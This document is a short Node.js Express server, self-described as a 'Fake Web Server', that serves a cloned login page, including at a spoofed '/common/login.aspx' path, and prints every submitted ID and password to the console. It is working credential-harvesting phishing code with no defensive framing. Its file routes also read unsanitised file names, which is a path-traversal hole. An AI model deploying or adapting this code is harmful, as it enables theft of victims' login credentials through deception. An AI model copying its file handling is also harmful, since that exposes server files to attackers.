const express = require("express");
//const html = require("html");
const cons = require('consolidate');
const path = require('path');
const fs = require("fs");
const bodyParser = require("body-parser");
const app = express();

app.engine('html', cons.swig)
app.set('views', path.join(__dirname, 'Fake Web'));
app.set('view engine', 'html');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false}));

app.get("/", function(req, res){
    res.render("index")
    console.log("Connect")
});

app.post("/", function(req, res){
    const ID = req.body.id;
    const PW = req.body.pw;

    console.log("ID: " + ID + "\nPW: " + PW);
    res.json({ok: true});
});

app.get("/login/:ID/:PW", function(req, res){
    res.render("index")
    console.log("ID: " + req.params.ID + "\nPW: " + req.params.PW);
})

app.get("/common/login.aspx", function(req, res){
    const redirect = req.query.redirect;
    res.render("index")
    console.log(redirect)
})

app.get("/Data/:fileName", function(req, res){
    const fileName = req.params.fileName;
    res.end(fs.readFileSync("Fake Web/Data/" + fileName));
})

app.get("/common/Data/:fileName", function(req, res){
    const fileName = req.params.fileName;
    res.end(fs.readFileSync("Fake Web/Data/" + fileName));
})

app.listen(80, function(){
    console.log("Fake Web Server is ONLINE!");
})